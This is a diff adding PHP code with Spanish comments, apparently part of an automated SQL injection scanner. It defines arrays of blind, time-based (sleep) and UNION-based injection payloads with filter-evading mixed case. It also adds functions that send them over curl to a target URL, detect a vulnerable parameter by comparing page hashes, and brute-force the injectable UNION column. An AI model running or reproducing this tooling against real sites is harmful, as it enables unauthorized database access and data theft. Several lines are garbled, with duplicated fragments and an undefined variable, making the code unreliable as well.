@@ -1,0 +1,267 @@
+#PONER EN EL REMPLAZO DE --+- HACER UN CAMBIO EN LOS ENGODEOS DE HTML
+and 0=(select sleep(5))
+
+
+array( 	array(	array(" and 0x31=0x30"," and 0x31=0x31"),
+						" and sleep(5)" ,
+						 array(" or [*]"," and [*]"), 
+						 "999999.9 UNiOn aLl sElECt [*]" ),
+
+		 
+		array(	array(" and false--+-"," and true--+-"),	" and sleep(5)--+-"	, array(" or [*]--+-"," and [*]--+-"), "999999.9 UNiOn aLl sElECt [*]--+-"),
+		array(	array("' and 0x31=0x30--+-","' and 0x31=0x31--+-"), "' and 0=(select sleep(5))--+-"	),
+		array(	array("' and 0x31=0x30","' and 0x31=0x31")	),
+		array(	array(" and false"," and true")	),
+		array(	array("' and false and '0x31'='0x31","' and true and '0x31'='0x31")	),
+		array(	array("' and false and '0x31'='0x31--+-","' and true and '0x31'='0x31--+-")	),
+						
+						
+		array(	array(") and false--+-",") and true--+-")	),
+		array(	array(") and false",") and true")	),
+		array(	array("') and false and '0x31'='0x31","') and true and '0x31'='0x31")	),
+		array(	array("') and false and '0x31'='0x31--+-","') and true and '0x31'='0x31--+-")	),
+		array(	array("') and 0x31=0x30","') and 0x31=0x31")	),
+
+		array(	array(")) and false--+-",")) and true--+-")	),
+		array(	array(")) and false",")) and true")	),
+		array(	array("')) and false and '0x31'='0x31","')) and true and '0x31'='0x31")	),
+		array(	array("')) and false and '0x31'='0x31--+-","')) and true and '0x31'='0x31--+-")	),
+		array(	array("')) and 0x31=0x30","')) and 0x31=0x31")	),
+						
+		array(	array(") and (false--+-",") and (true--+-")	),
+		array(	array(") and (false",") and (true")	),
+		array(	array("') and false and ('0x31'='0x31","') and true and ('0x31'='0x31")	),
+		array(	array("') and false and ('0x31'='0x31--+-","') and true and ('0x31'='0x31--+-")	),
+						
+
+		array(	array(")) and (false--+-",")) and ((true--+-")	),
+		array(	array(")) and ((false",")) and ((true")	),
+		array(	array("')) and false and (('0x31'='0x31","')) and true and (('0x31'='0x31")	),
+		array(	array("')) and false and (('0x31'='0x31--+-","')) and true and (('0x31'='0x31--+-")	),
+		array(	array("')) and false and ((0x31=0x31","')) and true and ((0x31=0x31")	),
+
+		array(	array(",false,false)--+-",",true,true)--+-")	),
+		array(	array(",false,false)",",true,true)")	),
+		array(	array(",false,false))--+-",",true,true))--+-")	),
+		array(	array(",false,false))",",true,true))")	),
+
+		array(	array(") THEN false ELSE false END--+-",") THEN true ELSE true END--+-")	),
+		array(	array(") THEN false ELSE false END)--+-",") THEN true ELSE true END)--+-")	),
+
+		array(	array("') THEN false ELSE false END--+-","') THEN true ELSE true END and '0x31'='0x31--+-")	),
+		array(	array("') THEN false ELSE false END--+-","') THEN true ELSE true END and--+-")	),
+		array(	array("') THEN false ELSE false END--+-","') THEN true ELSE true END and")	),
+		array(	array("') THEN false ELSE false END)--+-","') THEN true ELSE true END)  and '0x31'='0x31--+-")	),
+
+
+
+		array(	array(' and false--+-',' and true--+-')	),
+		array(	array(' and false',' and true')	),
+		array(	array('" and false and "0x31"="0x31','" and true and "0x31"="0x31')	),
+		array(	array('" and false and "0x31"="0x31--+-','" and true and "0x31"="0x31--+-')	),
+		array(	array('" and 0x31=0x30','" and 0x31=0x31')	),
+						
+		array(	array(') and false--+-',') and true--+-')	),
+		array(	array(') and false',') and true')	),
+		array(	array('") and false and "0x31"="0x31','") and true and "0x31"="0x31')	),
+		array(	array('") and false and "0x31"="0x31--+-','") and true and "0x31"="0x31--+-')	),
+		array(	array('") and 0x31=0x30','") and 0x31=0x31')	),
+
+		array(	array(')) and false--+-',')) and true--+-')	),
+		array(	array(')) and false',')) and true')	),
+		array(	array('")) and false and "0x31"="0x31','")) and true and "0x31"="0x31')	),
+		array(	array('")) and false and "0x31"="0x31--+-','")) and true and "0x31"="0x31--+-')	),
+		array(	array('")) and 0x31=0x30','")) and 0x31=0x31')	),
+						
+		array(	array(') and (false--+-',') and (true--+-')	),
+		array(	array(') and (false',') and (true')	),
+		array(	array('") and false and ("0x31"="0x31','") and true and ("0x31"="0x31')	),
+		array(	array('") and false and ("0x31"="0x31--+-','") and true and ("0x31"="0x31--+-')	),
+		array(	array('") and false and (0x31=0x31','") and true and (0x31=0x31')	),
+
+		array(	array(')) and (false--+-',')) and ((true--+-')	),
+		array(	array(')) and ((false',')) and ((true')	),
+		array(	array('")) and false and (("0x31"="0x31','")) and true and (("0x31"="0x31')	),
+		array(	array('")) and false and (("0x31"="0x31--+-','")) and true and (("0x31"="0x31--+-')	),
+		array(	array('")) and false and ((0x31=0x31','")) and true and ((0x31=0x31')	),
+
+
+						),
+						
+
+		"basico"=>array("999999.9 UNiOn  aLl  sElECt [*]--+-",
+						"999999.9' UNiOn  aLl  sElECt [*] OrDEr  By '0x31",
+						"999999.9' UNiOn  aLl  sElECt [*] OrDEr  By '0x31--+-",
+						"999999.9') UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and ('0x31'='0x31",
+						"999999.9') UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and ('0x31'='0x31--+-",
+						"999999.9')) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and (('0x31'='0x31",
+						"999999.9')) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and (('0x31'='0x31--+-",
+						"999999.9' UNiOn  aLl  sElECt [*]",
+						"999999.9') UNiOn  aLl  sElECt [*]--+-",
+						"999999.9) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and (0x31=0x31'",
+						"999999.9)) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and ((0x31=0x31",
+						'999999.9") UNiOn  aLl  sElECt [*]--+-',
+						'999999.9" UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and "0x31"="0x31',
+						'999999.9" UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and "0x31"="0x31--+-',
+						'999999.9") UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and ("0x31"="0x31',
+						'999999.9") UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and ("0x31"="0x31--+-',
+						'999999.9")) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and (("0x31"="0x31',
+						'999999.9")) UNiOn  aLl  sElECt [*] OrDEr  By 0x31 and (("0x31"="0x31--+-',
+						);
+
+
+
+
+
+
+
+
+#public function esDobleEncoding($encodear=1)
+
+
+
+
+
+
+public function esVulnerable($tipoVerificacion=null)
+	{
+
+
+			$this->curl($this->linkPagina,null,0,null,0);
+			$pagina	=	md5($this->exe_curl());
+
+			echo "Payload key de injeccion utilizado: ";			
+
+			for ($i=0; $i < count($this->tiposUniones["blind"]); $i++)
+			{ 
+				echo $i.",";
+				$this->curl($this->linkPagina.$this->tiposUniones["blind"][$i][0],null,0,null,0);tiposUniones["blind"][$i][0]);
+
+				//verificando si las injecciones se introducen al html
+				if (preg_match_all('#'.$expre.'#i', $filtroForWaf=$this->exe_curl()))
+				{
+					#echo "\nno se injecta la en html: false->:$i";
+					$paginaFalse = md5(preg_replace("#".$expre."#", "", $filtroForWaf));				
+				}
+				else
+				{
+					#echo "\ntodo bien :true-->:$i-----------";
+					$paginaFalse =	md5($this->exe_curl());
+				}
+	
+
+
+
+				$this->curl($this->linkPagina.$this->tiposUniones["blind"][$i][1],null,0,null,0);tiposUniones["blind"][$i][1]);
+
+				if (preg_match_all('#'.$expre.'#i', $filtroForWaf=$this->exe_curl()))
+				{
+					#echo "\nno se injecta la en html: false->:$i";
+					$paginaTrue = md5(preg_replace("#".$expre."#", "", $filtroForWaf));					
+				}
+				else
+				{
+					#echo "\ntodo bien :true-->:$i-----------";
+					$paginaTrue =	md5($this->exe_curl());
+				}
+
+
+
+				if($pagina==$paginaTrue and $pagina!=$paginaFalse)
+				{
+					#$this->linkBlind=$this->tiposUniones["blind"][$i][1];
+					echo "\n\n\nLink vulnerable  ".$this->linkPagina.$this->tiposUniones["blind"][$i][1];
+					return true;
+				}
+
+			}
+
+
+
+
+		echo "NOOOOOOOOO ES VULNERABLE";
+
+
+	}
+
+
+
+
+
+public function saberColumnaVulnerable($colmInicial=1,$colmfinal=26)
+	{
+		for ($z=0; $z < count($this->tiposUniones["basico"]) ; $z++)
+		{ 
+			echo "payload utilizado: ".$z."\n";
+			$sasa=$this->prepararLink($this->prepararLink($this->linkPagina,$this->tiposUniones['basico'][$z]));
+			$centro='0x'.bin2hex('*|>1<|*');
+			$rara=$sasa[0].$centro.$sasa[1];
+			$this->curl($rara,null,0,null,0);
+			$referencia=$this->exe_curl();
+			
+			
+			
+			if(preg_match('#\*\|\>(.*?)\<\|\*#', $referencia,$columna))
+			{
+				$vulne=1;
+				break;
+			}
+			else
+			{
+					
+					for ($i=$colmInicial+1; $i <= $colmfinal ; $i++)
+					{
+						$centro=$centro.','.'0x'.bin2hex('*|>'.$i.'<|*');
+						
+
+						$this->curl($sasa[0].$centro.$sasa[1],null,0,null,0);
+						
+						if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
+						{
+							$vulne=1;
+							break;
+							
+						}
+						
+
+					}
+
+			}
+
+
+
+			for ($a=1; $a <= $i; $a++)
+			{
+				if($a==1)
+				{
+					if($a==$columna[1])
+					{
+						$numColum='[*]';
+					}
+					else
+					{
+						$numColum=$a;
+					}
+					
+				}
+				else
+				{
+					if($a==$columna[1])
+					{
+						$numColum=$numColum.','.'[*]';
+					}
+					else
+					{
+						$numColum=$numColum.','.$a;
+					}
+				}
+
+			}
+				if($vulne==1)
+				{
+					return $this->linkYcolumnas	=	$sasa[0].$numColum.$sasa[1];
+				}
+		}
+
+	}
+
